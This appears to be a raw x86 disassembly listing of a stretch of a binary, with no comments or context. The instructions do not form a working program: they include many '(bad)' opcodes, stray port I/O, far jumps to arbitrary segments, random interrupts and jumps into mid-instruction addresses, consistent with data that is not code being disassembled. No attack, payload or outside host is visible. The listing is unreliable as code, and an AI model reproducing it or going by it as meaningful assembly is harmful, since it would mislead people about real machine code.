  6b5d4c:	clc    
  6b5d4d:	mov    esp,0xb9a4cad3
  6b5d52:	xor    DWORD PTR [ecx-0x46],edx
  6b5d55:	repz xchg esp,eax
  6b5d57:	ss adc ch,dh
  6b5d5a:	sub    eax,0xa7fac049
  6b5d5f:	jmp    0x7884:0xf3c84d61
  6b5d66:	mov    ch,BYTE PTR [eax]
  6b5d68:	adc    ecx,DWORD PTR [eax-0x3b10b1f5]
  6b5d6e:	dec    edx
  6b5d6f:	shl    DWORD PTR [ecx+edi*4-0x29],cl
  6b5d73:	ret    
  6b5d74:	mov    cl,0x7d
  6b5d76:	scas   eax,DWORD PTR es:[edi]
  6b5d77:	in     eax,0x93
  6b5d79:	daa    
  6b5d7a:	sub    BYTE PTR [ecx+ecx*1+0x4ab50fb5],0x15
  6b5d82:	sub    al,0xb5
  6b5d84:	or     bh,BYTE PTR [edi-0x3b]
  6b5d87:	xchg   ebp,eax
  6b5d88:	stc    
  6b5d89:	ins    DWORD PTR es:[edi],dx
  6b5d8a:	ss sbb dl,bl
  6b5d8d:	(bad)  
  6b5d8e:	fsubr  DWORD PTR [edx-0x5878d03c]
  6b5d94:	retf   
  6b5d95:	stos   DWORD PTR es:[edi],eax
  6b5d96:	pop    eax
  6b5d97:	xor    DWORD PTR [edi],ecx
  6b5d99:	add    dl,BYTE PTR ds:0xeee81443
  6b5d9f:	sbb    ah,BYTE PTR [ebp-0x90421b9]
  6b5da5:	out    0xc,al
  6b5da7:	call   0xeb00a8d2
  6b5dac:	mov    edi,0x3bd7486
  6b5db1:	pushf  
  6b5db2:	fiadd  WORD PTR [edx+ecx*1-0x160a9d8d]
  6b5db9:	add    BYTE PTR [edi-0x2f0a22fd],dh
  6b5dbf:	mov    bl,0x89
  6b5dc1:	imul   esp,DWORD PTR [edi+edi*8],0xe2236ae6
  6b5dc8:	gs cmc 
  6b5dca:	rcr    BYTE PTR ds:0xbc4aad95,1
  6b5dd0:	jl     0x6b5e31
  6b5dd2:	cmp    BYTE PTR ds:0xe611334e,bh
  6b5dd8:	retf   0xe272
  6b5ddb:	ins    BYTE PTR es:[edi],dx
  6b5ddc:	es das 
  6b5dde:	and    eax,0x6ae1b02a
  6b5de3:	xchg   ecx,eax
  6b5de4:	mov    eax,ds:0x57467981
  6b5de9:	inc    esi
  6b5dea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b5deb:	push   0x183549f3
  6b5df0:	xlat   BYTE PTR fs:[ebx]
  6b5df2:	pop    ebx
  6b5df3:	push   esi
  6b5df4:	nop
  6b5df5:	xchg   DWORD PTR [ebp+0x776db10a],eax
  6b5dfb:	dec    edi
  6b5dfc:	int    0x38
  6b5dfe:	pushf  
  6b5dff:	arpl   WORD PTR [ecx+0x7c],ax
  6b5e02:	jae    0x6b5e77
  6b5e04:	xchg   esi,eax
  6b5e06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b5e07:	cmp    ecx,DWORD PTR [ecx-0x26]
  6b5e0a:	in     al,0x8d
  6b5e0c:	mov    esi,DWORD PTR [esi+0x32]
  6b5e0f:	rcl    BYTE PTR [esi],0xd3
  6b5e12:	sbb    esi,DWORD PTR [esi-0x50]
  6b5e15:	(bad)  
  6b5e16:	push   ebp
  6b5e17:	lea    ebp,[edx]
  6b5e19:	js     0x6b5e0b
  6b5e1b:	inc    edi
  6b5e1c:	mov    ebx,0x8900391c
  6b5e21:	and    al,0x24
  6b5e23:	inc    ecx
  6b5e24:	sbb    cl,al
  6b5e26:	into   
  6b5e27:	mov    dl,0x2
  6b5e29:	cmp    eax,0x31bae696
  6b5e2e:	addr16 cmp al,0xd1
  6b5e31:	inc    ebp
  6b5e32:	retf   0xb087
  6b5e35:	push   edi
  6b5e36:	pop    edi
  6b5e37:	inc    ecx
  6b5e38:	cmp    al,0x5e
  6b5e3a:	mov    BYTE PTR [esi],bh
  6b5e3c:	sub    al,0xdc
  6b5e3e:	cwde   
  6b5e3f:	inc    esp
  6b5e40:	jnp    0x6b5e36
  6b5e42:	sub    BYTE PTR [ebp+edx*8-0x42],al
  6b5e46:	cmp    DWORD PTR ds:0x131938bc,ecx
  6b5e4c:	rcr    DWORD PTR [esi+0xdb2c015],cl
  6b5e52:	sti    
  6b5e53:	adc    DWORD PTR [edx+edi*8+0x13],edx
  6b5e57:	cld    
  6b5e58:	adc    esi,ebx
  6b5e5a:	mov    ecx,0xff2a4142
  6b5e5f:	out    0xde,al
  6b5e61:	lods   al,BYTE PTR ds:[esi]
  6b5e62:	gs jne 0x6b5eb4
  6b5e65:	aad    0x3a
  6b5e67:	pop    edi
  6b5e68:	or     eax,0x2afd527a
  6b5e6d:	dec    ecx
  6b5e6e:	pop    esi
  6b5e6f:	add    DWORD PTR [ecx],esi
  6b5e71:	dec    esp
  6b5e72:	and    BYTE PTR [edx-0x19],dl
  6b5e75:	xor    eax,0x6f8beebd
  6b5e7a:	dec    ecx
  6b5e7b:	stc    
  6b5e7c:	out    dx,al
  6b5e7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b5e7e:	cmp    al,BYTE PTR [esi]
  6b5e80:	jns    0x6b5e5f
  6b5e82:	jno    0x6b5eed
  6b5e84:	ror    dh,cl
  6b5e86:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  6b5e88:	sti    
  6b5e89:	inc    edx
  6b5e8a:	cwde   
  6b5e8b:	jae    0x6b5e8b
  6b5e8d:	inc    edx
  6b5e8e:	out    0x36,eax
  6b5e90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b5e91:	and    BYTE PTR [eax+eax*4-0x78],0xf
  6b5e96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b5e97:	ficomp DWORD PTR [ebx]
  6b5e99:	mov    ch,0xd2
  6b5e9b:	push   ds
  6b5e9c:	or     BYTE PTR [eax-0x1a],bl
  6b5e9f:	push   ebx
  6b5ea0:	ret    
  6b5ea1:	and    ah,BYTE PTR [edi]
  6b5ea3:	cmc    
  6b5ea4:	push   esp
  6b5ea5:	xor    BYTE PTR [ecx-0x278e752f],dh
  6b5eab:	jg     0x6b5f12
  6b5ead:	shl    BYTE PTR [eax-0x67],1
  6b5eb0:	push   eax
  6b5eb1:	add    esi,DWORD PTR [edx]
  6b5eb3:	nop
  6b5eb4:	(bad)  
  6b5eb5:	retf   
  6b5eb6:	fadd   QWORD PTR [ebx+ebp*2-0x1d4c5cc]
  6b5ebd:	imul   ecx,esi,0xb3c5cda1
  6b5ec3:	jmp    DWORD PTR [ecx+0x23]
  6b5ec6:	lahf   
  6b5ec7:	js     0x6b5e87
  6b5ec9:	mov    bl,0x9e
  6b5ecb:	fsub   st(5),st
  6b5ecd:	jns    0x6b5e55
  6b5ecf:	int3   
  6b5ed0:	scas   eax,DWORD PTR es:[edi]
  6b5ed1:	cld    
  6b5ed2:	test   eax,0x71e66f56
  6b5ed7:	xor    eax,eax
  6b5ed9:	jge    0x6b5e93
  6b5edb:	add    al,0xa4
  6b5edd:	inc    eax
  6b5ede:	cli    
  6b5edf:	cmp    ch,bh
  6b5ee1:	adc    DWORD PTR [eax],edi
  6b5ee3:	jmp    0xff7d3f13
  6b5ee8:	mov    bl,0x4c
  6b5eea:	int3   
  6b5eeb:	dec    ecx
  6b5eec:	pop    esi
  6b5eed:	sbb    BYTE PTR [esi+eax*8-0x53e98e3d],ch
  6b5ef4:	xor    BYTE PTR [eax],dl
  6b5ef6:	adc    eax,DWORD PTR [edx-0x35]
  6b5ef9:	push   0xffffff97
  6b5efb:	jmp    0x8a2b61bb
  6b5f00:	mov    eax,0xb981ed05
  6b5f05:	out    dx,eax
  6b5f06:	push   es
  6b5f07:	outs   dx,DWORD PTR ds:[esi]
  6b5f08:	jno    0x6b5f58
  6b5f0a:	jmp    0x490a:0xc6c85a84
  6b5f11:	dec    esp
  6b5f12:	xor    al,0x6b
  6b5f14:	(bad)  
  6b5f15:	out    0x32,eax
  6b5f17:	sar    BYTE PTR [esi+0x35254f91],0xd2
  6b5f1e:	cli    
  6b5f1f:	mov    dh,0x69
  6b5f21:	aaa    
  6b5f22:	cld    
  6b5f23:	test   BYTE PTR [edx],cl
  6b5f25:	and    bl,BYTE PTR [esi+0xb2a0915]
  6b5f2b:	(bad)  
  6b5f2c:	int    0xb
  6b5f2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b5f2f:	jp     0x6b5f16
  6b5f31:	enter  0xbc3f,0x40
  6b5f35:	mov    esp,0xbb191035
  6b5f3a:	iret   
  6b5f3b:	adc    eax,0x471478c5
  6b5f40:	dec    ebx
  6b5f41:	inc    BYTE PTR [esi+0x5f]
  6b5f44:	and    DWORD PTR [ecx-0x5],0x3d
  6b5f48:	std    
  6b5f49:	xchg   ecx,eax
  6b5f4a:	adc    al,0x54
  6b5f4c:	push   ecx
  6b5f4d:	test   DWORD PTR [edx],0xdc28c8c9
  6b5f53:	cmovno ebp,DWORD PTR [eax]
  6b5f56:	jnp    0x6b5f87
  6b5f58:	ins    DWORD PTR es:[edi],dx
  6b5f59:	in     al,dx
  6b5f5a:	jg     0x6b5fbd
  6b5f5c:	ins    BYTE PTR es:[edi],dx
  6b5f5d:	mov    ecx,DWORD PTR [esi]
  6b5f5f:	clc    
  6b5f60:	test   eax,0x95e6e096
  6b5f65:	push   ecx
  6b5f66:	dec    ebx
  6b5f67:	push   esi
  6b5f68:	test   BYTE PTR [eax+ebx*2+0x7ac7bdf6],ch
  6b5f6f:	xchg   esi,eax
  6b5f70:	mov    dh,0xb9
  6b5f72:	dec    ecx
  6b5f73:	pavgw  mm4,mm7
  6b5f76:	inc    ecx
  6b5f77:	mov    bh,0xd3
  6b5f79:	xor    eax,0xb12c1e3d
  6b5f7e:	aad    0x3b
  6b5f80:	repnz or al,BYTE PTR ds:[ebx]
  6b5f84:	xor    ah,ah
  6b5f86:	cld    
  6b5f87:	(bad)  
  6b5f88:	and    dh,BYTE PTR [eax+0x2d]
  6b5f8b:	sub    eax,DWORD PTR [eax-0x3b]
  6b5f8e:	mov    eax,ds:0x24384b65
  6b5f93:	mov    ch,0xbd
  6b5f95:	hlt    
  6b5f96:	out    0xe1,al
  6b5f98:	fcomp  st(4)
  6b5f9a:	int    0xa9
  6b5f9c:	mov    eax,0x9c595e22
  6b5fa1:	jb     0x6b5f28
  6b5fa3:	mov    esp,ecx
  6b5fa5:	jbe    0x6b5fdd
  6b5fa7:	leave  
  6b5fa8:	xchg   DWORD PTR [edx-0x540dd621],esp
  6b5fae:	hlt    
  6b5faf:	mov    bl,ch
  6b5fb1:	pushf  
  6b5fb2:	out    0x97,eax
  6b5fb4:	or     ebx,0x60
  6b5fb7:	xor    eax,DWORD PTR [eax-0x5a654cc8]
  6b5fbd:	and    eax,0xc5fb40cb
  6b5fc2:	sub    eax,0x5ff73c20
  6b5fc7:	push   edx
  6b5fc8:	mov    ecx,DWORD PTR [ecx-0x2e7fedf3]
  6b5fce:	test   DWORD PTR [eax],eax
  6b5fd0:	pop    esp
  6b5fd1:	and    bl,cl
  6b5fd3:	xchg   ebx,eax
  6b5fd4:	adc    al,0x36
  6b5fd6:	imul   esi,DWORD PTR [esp+ebx*8-0x3e],0x31
  6b5fdb:	mov    al,0xfa
  6b5fdd:	inc    ebx
  6b5fde:	popa   
  6b5fdf:	repz jle 0x6b5faf
  6b5fe2:	add    dl,BYTE PTR ds:0xe550fbb2
  6b5fe8:	nop
  6b5fe9:	inc    edx
  6b5fea:	inc    esi
  6b5feb:	jno    0x6b5fd4
  6b5fed:	push   edi
  6b5fee:	pop    edi
  6b5fef:	dec    BYTE PTR [eiz*8-0x5f04fc90]
  6b5ff6:	call   0xe010:0xd7f8d30a
  6b5ffd:	mov    WORD PTR [ecx],cs
  6b5fff:	aad    0x24
  6b6001:	sub    al,0x57
  6b6003:	xor    esp,DWORD PTR [esi+ebx*8-0x30]
  6b6007:	mov    ah,0xc4
  6b6009:	cmp    al,0x32
  6b600b:	out    dx,al
  6b600c:	mov    bl,0xaa
  6b600e:	aas    
  6b600f:	dec    eax
  6b6010:	pop    ebp
  6b6011:	imul   ebx,DWORD PTR [edx],0xffffff9d
  6b6014:	mov    edx,0x6f5fe79b
  6b6019:	sbb    eax,0xeb923a45
  6b601e:	xchg   ebx,eax
  6b601f:	pop    ebp
  6b6020:	mul    BYTE PTR [ebp+ebx*8+0x2a7ef959]
  6b6027:	xchg   ebx,eax
  6b6028:	mov    esi,0x1c6cb4b8
  6b602d:	mov    edx,0x7b07de0f
  6b6032:	cld    
  6b6033:	jp     0x6b607e
  6b6035:	mov    bh,0x42
  6b6037:	es test eax,0xa884712b
  6b603d:	mov    ebx,0x78cc35df
  6b6042:	ja     0x6b5ffe
  6b6044:	stos   DWORD PTR es:[edi],eax
  6b6045:	jge    0x6b6040
  6b6047:	adc    bh,BYTE PTR [ebp+0x5]
  6b604a:	pop    ecx
  6b604b:	and    BYTE PTR [edx+0x257d64f8],0xef
  6b6052:	jle    0x6b5fde
  6b6054:	cmc    
  6b6055:	cmp    cl,BYTE PTR [ecx-0x2be300f9]
  6b605b:	adc    dh,dh
  6b605d:	pusha  
  6b605e:	clc    
  6b605f:	sub    dl,BYTE PTR [esi]
  6b6061:	adc    esi,DWORD PTR ds:0xd65aa210
  6b6067:	lods   al,BYTE PTR ds:[esi]
  6b6068:	inc    edx
  6b6069:	inc    edx
  6b606a:	popa   
  6b606b:	mov    esi,DWORD PTR [edx+0x3986c5b7]
  6b6071:	bound  ebp,QWORD PTR [edx]
  6b6073:	inc    esp
  6b6074:	mov    eax,edi
  6b6076:	push   ss
  6b6077:	or     ch,al
  6b6079:	test   eax,0xe6b96455
  6b607e:	repnz (bad) 
  6b6080:	sar    dh,1
  6b6082:	xchg   esp,eax
  6b6083:	ss and al,0x20
  6b6086:	int    0xc2
  6b6088:	fmul   st(3),st
  6b608a:	ror    BYTE PTR [eax],cl
  6b608c:	dec    edx
  6b608d:	push   ds
  6b608e:	jmp    0xe06e:0x572e8f6c
  6b6095:	iret   
  6b6096:	fimul  DWORD PTR [edi-0x44]
  6b6099:	loope  0x6b6104
  6b609b:	or     eax,0x62bd628
  6b60a0:	jecxz  0x6b6063
  6b60a2:	push   esi
  6b60a3:	or     al,0xd3
  6b60a5:	mov    al,0x8b
  6b60a7:	stc    
  6b60a8:	scas   eax,DWORD PTR es:[edi]
  6b60a9:	or     ecx,ebp
  6b60ab:	jle    0x6b6124
  6b60ad:	ins    BYTE PTR es:[edi],dx
  6b60ae:	jb     0x6b610e
  6b60b0:	fild   WORD PTR [edi-0x6]
  6b60b3:	lock into 
  6b60b5:	push   ecx
  6b60b6:	mov    ebx,0xcf36fd16
  6b60bb:	cmc    
  6b60bc:	fist   DWORD PTR [eax]
  6b60be:	cdq    
  6b60bf:	mov    ah,0x14
  6b60c1:	jge    0x6b60d8
  6b60c3:	xchg   esi,eax
  6b60c4:	mov    bh,0xc2
  6b60c6:	xchg   DWORD PTR [ebx+edi*1],esi
  6b60c9:	jbe    0x6b6141
  6b60cb:	clc    
  6b60cc:	fsubrp st(6),st
  6b60ce:	push   ecx
  6b60cf:	xchg   ebp,eax
  6b60d0:	or     al,0x99
  6b60d2:	sti    
  6b60d3:	add    ah,BYTE PTR [ebx-0x1b]
  6b60d6:	icebp  
  6b60d7:	das    
  6b60d8:	xchg   edx,eax
  6b60d9:	inc    eax
  6b60da:	sub    eax,0x33eaf630
  6b60df:	aas    
  6b60e0:	enter  0x7589,0x0
  6b60e4:	mov    eax,0x18429bec
  6b60e9:	cmp    cl,BYTE PTR [esi-0x54]
  6b60ec:	push   esp
  6b60ed:	add    esp,DWORD PTR [ebp+0x62]
  6b60f0:	push   0xffffffbd
  6b60f2:	pop    eax
  6b60f3:	xor    al,0xf1
  6b60f5:	retf   0x5772
  6b60f8:	ret    
  6b60f9:	ins    BYTE PTR es:[edi],dx
  6b60fa:	adc    BYTE PTR [edi],ah
  6b60fc:	jno    0x6b6096
  6b60fe:	ins    BYTE PTR es:[edi],dx
  6b60ff:	stos   BYTE PTR es:[edi],al
  6b6100:	into   
  6b6101:	mov    BYTE PTR [edx],bh
  6b6103:	scas   al,BYTE PTR es:[edi]
  6b6104:	inc    esp
  6b6105:	mov    bh,0xd7
  6b6107:	cwde   
  6b6108:	mov    bl,0x5
  6b610a:	test   bl,cl
  6b610c:	cmp    al,0xc7
  6b610f:	out    dx,eax
  6b6110:	add    eax,0x30352172
  6b6115:	push   ebx
  6b6116:	xor    BYTE PTR [ecx+eax*8+0x7f9c796b],bl
  6b611d:	scas   al,BYTE PTR es:[edi]
  6b611e:	jbe    0x6b617d
  6b6120:	pause  
  6b6122:	and    al,0xa2
  6b6124:	icebp  
  6b6125:	mov    dh,0x54
  6b6127:	out    0x9c,eax
  6b6129:	sub    eax,0x87d317ad
  6b612e:	push   esi
  6b612f:	aad    0x1a
  6b6131:	repnz stos DWORD PTR es:[edi],eax
  6b6133:	pop    ebx
  6b6134:	popa   
  6b6135:	ja     0x6b6110
  6b6137:	adc    BYTE PTR [esi],cl
  6b6139:	mov    ebx,0x28f1b73f
  6b613e:	xor    ah,BYTE PTR [edx]
  6b6140:	dec    eax
  6b6141:	ins    DWORD PTR es:[edi],dx
  6b6142:	xlat   BYTE PTR ds:[ebx]
  6b6143:	scas   al,BYTE PTR es:[edi]
  6b6144:	lods   al,BYTE PTR ds:[esi]
  6b6145:	cmp    ebx,ebp
  6b6147:	pop    esp
  6b6148:	retf   
  6b6149:	cmp    esi,ebp
  6b614b:	iret   
  6b614c:	cli    
  6b614d:	and    BYTE PTR [ebx+0xc],ch
  6b6150:	pop    ss
  6b6151:	ret    0x7bee
  6b6154:	out    0x23,eax
  6b6156:	fnstsw WORD PTR [esp+ebx*1]
  6b6159:	pop    ecx
  6b615a:	sbb    eax,DWORD PTR [ecx]
  6b615c:	pop    esi
  6b615d:	and    DWORD PTR [ebp+0x29],0x6c3cf715
  6b6164:	mov    ds:0x4a2b9b26,al
  6b6169:	ror    edx,1
  6b616b:	jle    0x6b6116
  6b616d:	xchg   edi,eax
  6b616e:	adc    cl,BYTE PTR [ebp+0x18]
  6b6171:	adc    ch,BYTE PTR [esi-0x58]
  6b6174:	adc    DWORD PTR [edx-0x3f27f051],0x3fb11f22
  6b617e:	or     cl,al
  6b6180:	or     eax,0xbd680b3
  6b6185:	push   edx
  6b6186:	loop   0x6b618e
  6b6188:	outs   dx,DWORD PTR ds:[esi]
  6b6189:	xor    WORD PTR [esp+edi*8],bx
  6b618d:	push   ecx
  6b618e:	adc    DWORD PTR [esi],ecx
  6b6190:	xchg   ebx,eax
  6b6191:	mov    ch,BYTE PTR [edi-0x62]
  6b6194:	outs   dx,DWORD PTR ds:[esi]
  6b6195:	in     eax,dx
  6b6196:	(bad)  
  6b6197:	cli    
  6b6198:	inc    ebp
  6b6199:	lods   eax,DWORD PTR ds:[esi]
  6b619a:	xchg   edx,eax
  6b619b:	clc    
  6b619c:	jmp    0x6b6135
  6b619e:	call   0x9124:0x42df61ca
  6b61a5:	sahf   
  6b61a6:	lods   al,BYTE PTR ds:[esi]
  6b61a7:	mov    ecx,0xf33a21a9
  6b61ac:	inc    ebp
  6b61ad:	fwait
  6b61ae:	mov    al,0x4
  6b61b0:	push   cs
  6b61b1:	lds    edx,FWORD PTR [ecx+0x7b24e228]
  6b61b7:	mov    esi,DWORD PTR [ecx-0x25]
  6b61ba:	push   edx
  6b61bb:	imul   ebx,DWORD PTR [edi+0x50],0x9851b13
  6b61c2:	jae    0x6b622b
  6b61c4:	sti    
  6b61c5:	cmp    eax,edi
  6b61c7:	ret    
  6b61c8:	sub    eax,0x790f32c0
  6b61cd:	fdivr  DWORD PTR [eax+0x58fceee]
  6b61d3:	jb     0x6b620b
  6b61d5:	mov    esp,0x8bb23ead
  6b61da:	push   ds
  6b61db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b61dc:	dec    ecx
  6b61dd:	mov    esi,0xae532479
  6b61e2:	or     BYTE PTR [ecx+0x37],cl
  6b61e5:	imul   edi,DWORD PTR [ecx],0x3f209177
  6b61eb:	pop    esp
  6b61ec:	std    
  6b61ed:	sub    BYTE PTR [ebp-0x14],dh
  6b61f0:	(bad)  
  6b61f1:	icebp  
  6b61f2:	cwde   
  6b61f3:	bound  eax,QWORD PTR [ebx+0x2f]
  6b61f6:	fdiv   QWORD PTR [ebx-0x3365a522]
  6b61fc:	adc    dh,bh
  6b61fe:	cmp    eax,0x677bfe9e
  6b6203:	and    BYTE PTR [esi-0x78228afd],0x2c
  6b620a:	sbb    DWORD PTR [edx+0x17],edi
  6b620d:	mov    ecx,0x5b222984
  6b6212:	xchg   edx,eax
  6b6213:	push   cs
  6b6214:	gs cld 
  6b6216:	jo     0x6b622f
  6b6218:	lock ss clc 
  6b621b:	or     al,0x94
  6b621d:	pop    edi
  6b621e:	outs   dx,DWORD PTR ds:[esi]
  6b621f:	mov    edi,0xeef2a622
  6b6224:	fbstp  TBYTE PTR [eax-0x1f]
  6b6227:	jb     0x6b6296
  6b6229:	pop    ebp
  6b622a:	into   
  6b622b:	sub    al,0xe7
  6b622d:	ds (bad) 
  6b622f:	loope  0x6b61eb
  6b6231:	arpl   WORD PTR [esi-0x59277438],cx
  6b6237:	dec    esi
  6b6238:	pop    edi
  6b6239:	shr    DWORD PTR [eax],0xcf
  6b623c:	stos   DWORD PTR es:[edi],eax
  6b623d:	sbb    eax,0x3bf4b1ad
  6b6242:	ja     0x6b6211
  6b6244:	xor    al,0xe5
  6b6246:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b6247:	loope  0x6b6259
  6b6249:	into   
  6b624a:	mov    WORD PTR ds:0xafb65553,?
  6b6250:	add    bh,cl
  6b6252:	aam    0x38
  6b6254:	sub    eax,0x94a3be24
  6b6259:	sbb    bh,BYTE PTR [ecx-0x49]
  6b625c:	fistp  WORD PTR [edx-0x63fac3d5]
  6b6262:	mov    ah,0xa3
  6b6264:	pop    ecx
  6b6265:	out    dx,al
  6b6266:	in     eax,dx
  6b6267:	(bad)  
  6b6268:	in     al,dx
  6b6269:	or     eax,0x18eecd4f
  6b626e:	push   ecx
  6b626f:	jecxz  0x6b62b9
  6b6271:	mov    al,BYTE PTR [edx]
  6b6273:	mov    ch,0x52
  6b6275:	cwde   
  6b6276:	mov    edi,0xe1316c6a
  6b627b:	test   BYTE PTR [eax-0x38],dl
  6b627e:	shl    DWORD PTR [eax-0x2ae7d9a3],0x12
  6b6285:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  6b6287:	pop    esp
  6b6288:	(bad)  
  6b6289:	idiv   BYTE PTR [ebx-0x23]
  6b628c:	jbe    0x6b62b5
  6b628e:	push   eax
  6b628f:	rol    DWORD PTR [ebp+0x52123b4c],1
  6b6295:	inc    esp
  6b6296:	xchg   esp,eax
  6b6297:	fld    TBYTE PTR [edx-0x46]
  6b629a:	stos   BYTE PTR es:[edi],al
  6b629b:	in     eax,dx
  6b629c:	fsub   QWORD PTR [esi-0x2d]
  6b629f:	in     al,0x88
  6b62a1:	xor    BYTE PTR [ecx],bl
  6b62a3:	dec    edi
  6b62a4:	xor    al,0x36
  6b62a6:	mov    cl,0x43
  6b62a8:	clc    
  6b62a9:	dec    esp
  6b62aa:	pop    edx
  6b62ab:	jno    0x6b631f
  6b62ad:	adc    edx,eax
  6b62af:	sub    ecx,DWORD PTR [ecx-0x3]
  6b62b2:	mov    bh,0xfe
  6b62b4:	xchg   ebx,eax
  6b62b5:	jne    0x6b6259
  6b62b7:	scas   eax,DWORD PTR es:[edi]
  6b62b8:	pop    esi
  6b62b9:	mov    BYTE PTR [esi-0x574587d3],ah
  6b62bf:	fs or  ebx,esp
  6b62c2:	test   eax,0x4813acd4
  6b62c7:	xchg   edi,eax
  6b62c8:	ins    BYTE PTR es:[edi],dx
  6b62c9:	adc    BYTE PTR [edi],cl
  6b62cb:	push   esp
  6b62cc:	test   BYTE PTR es:[edx*1-0x7e5d51bc],0x26
  6b62d5:	inc    esp
  6b62d6:	xchg   edi,eax
  6b62d7:	daa    
  6b62d8:	mov    ds:0xefb46025,al
  6b62dd:	push   ebp
  6b62de:	add    eax,0x3a289cb8
  6b62e3:	sub    eax,0x1ac3e4ad
  6b62e8:	sub    BYTE PTR [edx-0x14],bl
  6b62eb:	call   0x78d8475b
  6b62f0:	jmp    0x6b629d
  6b62f2:	into   
  6b62f3:	mov    WORD PTR [eax+eax*4],fs
  6b62f6:	call   0xf7bd:0xb585aa44
  6b62fd:	rcr    ebx,1
  6b62ff:	ret    0x9428
  6b6302:	cmp    DWORD PTR [eax-0x42],edx
  6b6305:	scas   eax,DWORD PTR es:[edi]
  6b6306:	cmp    al,0x76
  6b6308:	cs in  eax,dx
  6b630a:	mov    es,WORD PTR [edx*2-0x44305190]
  6b6311:	xor    BYTE PTR [edx+0x49a259d7],ch
  6b6317:	outs   dx,DWORD PTR ds:[esi]
  6b6318:	xadd   cl,dh
  6b631b:	xor    edx,DWORD PTR [ebp+0xd]
  6b631e:	xor    ecx,DWORD PTR [esi]
  6b6320:	adc    ah,ah
  6b6322:	pop    ebx
  6b6323:	xchg   esp,eax
  6b6324:	push   ss
  6b6325:	(bad)
  6b6329:	add    dl,BYTE PTR [ebx+0x4f219dcc]
  6b632f:	mov    dh,0x89
  6b6331:	mov    DWORD PTR [edi+0x67],ebx
  6b6334:	jge    0x6b63b2
  6b6336:	out    dx,al
  6b6337:	jns    0x92514ae8
  6b633d:	or     ebp,edx
  6b633f:	hlt    
  6b6340:	pushf  
  6b6341:	pop    ds
  6b6342:	leave  
  6b6343:	in     al,dx
  6b6344:	sbb    cl,BYTE PTR [ebx+0x3e4a46b6]
  6b634a:	scas   al,BYTE PTR es:[edi]
  6b634b:	imul   ebp,DWORD PTR [edx+0x1a5170e1],0x821af316
  6b6355:	loope  0x6b62f9
  6b6357:	jg     0x6b63ab
  6b6359:	sbb    al,BYTE PTR [ebx]
  6b635b:	inc    eax
  6b635c:	jp     0x6b6361
  6b635e:	das    
  6b635f:	out    dx,al
  6b6360:	xchg   BYTE PTR [esp+eax*4],ah
  6b6363:	nop
  6b6364:	lahf   
  6b6365:	das    
  6b6366:	adc    eax,0x236c9cd0
  6b636b:	icebp  
  6b636c:	js     0x6b6348
  6b636e:	cwde   
  6b636f:	sbb    eax,0xed205caa
  6b6374:	fs cli 
  6b6376:	(bad)  
  6b6377:	mov    ecx,0x58ed9e0a
  6b637c:	and    eax,DWORD PTR [edi+0x5cde9692]
  6b6382:	addr16 pop eax
  6b6384:	xchg   edx,eax
  6b6385:	pusha  
  6b6386:	daa    
  6b6387:	add    BYTE PTR [ecx],ch
  6b6389:	stos   BYTE PTR es:[edi],al
  6b638a:	test   al,0xa3
  6b638c:	bound  esp,QWORD PTR [edx+0x51435c61]
  6b6392:	jecxz  0x6b63cb
  6b6394:	jg     0x6b6367
  6b6396:	add    eax,0x7aaf3307
  6b639b:	stc    
  6b639c:	cmc    
  6b639d:	mov    al,ds:0x2d38068d
  6b63a2:	and    eax,0xd1fe3eec
  6b63a7:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  6b63a9:	xchg   edx,eax
  6b63aa:	dec    ecx
  6b63ab:	cmp    BYTE PTR [edi-0x62415b3c],ah
  6b63b1:	bound  ebx,QWORD PTR [ecx]
  6b63b3:	mov    bh,0xe7
  6b63b5:	test   DWORD PTR [esi+0x71b8d641],0x35032424
  6b63bf:	sbb    al,BYTE PTR [edi]
  6b63c1:	jle    0x6b63e0
  6b63c3:	xor    DWORD PTR [ebp+edx*1-0x3b],0x71
  6b63c8:	adc    ch,bh
  6b63ca:	imul   BYTE PTR [esi+0x57f20ab1]
  6b63d0:	and    esi,DWORD PTR [esi-0xeadd352]
  6b63d6:	mov    esp,DWORD PTR [edi+eiz*1]
  6b63d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b63da:	lods   al,BYTE PTR ds:[esi]
  6b63db:	ret    
  6b63dc:	stc    
  6b63dd:	idiv   BYTE PTR [edx-0x59]
  6b63e0:	icebp  
  6b63e1:	pop    edx
  6b63e2:	mov    al,0x7
  6b63e4:	outs   dx,BYTE PTR ds:[esi]
  6b63e5:	adc    edx,DWORD PTR [ebx]
  6b63e7:	jmp    0xf48baeb5
  6b63ec:	push   0x9b545a4c
  6b63f1:	pop    esp
  6b63f2:	cli    
  6b63f3:	jns    0x6b645d
  6b63f5:	jecxz  0x6b6413
  6b63f7:	mov    ah,0xad
  6b63f9:	push   cs
  6b63fa:	dec    esi
  6b63fb:	imul   ebp,DWORD PTR [esi],0x7e
  6b63fe:	outs   dx,DWORD PTR ds:[esi]
  6b63ff:	fstp   QWORD PTR [edx-0x2c]
  6b6402:	iret   
  6b6403:	hlt    
  6b6404:	sbb    ebx,eax
  6b6406:	hlt    
  6b6407:	add    ah,BYTE PTR [eax-0x72de8444]
  6b640d:	mov    dl,0x50
  6b640f:	pop    ebp
  6b6410:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b6411:	mov    esp,0xdcc88e5f
  6b6416:	int    0x1b
  6b6418:	out    0xa,al
  6b641a:	xor    ah,BYTE PTR [ebp+0x72]
  6b641d:	jnp    0x6b644f
  6b641f:	inc    eax
  6b6420:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b6421:	inc    BYTE PTR ds:0xb12cce09
  6b6427:	sahf   
  6b6428:	int3   
  6b6429:	push   es
  6b642a:	ret    
  6b642b:	test   al,0xd
  6b642d:	ins    DWORD PTR es:[edi],dx
  6b642e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b642f:	aad    0x93
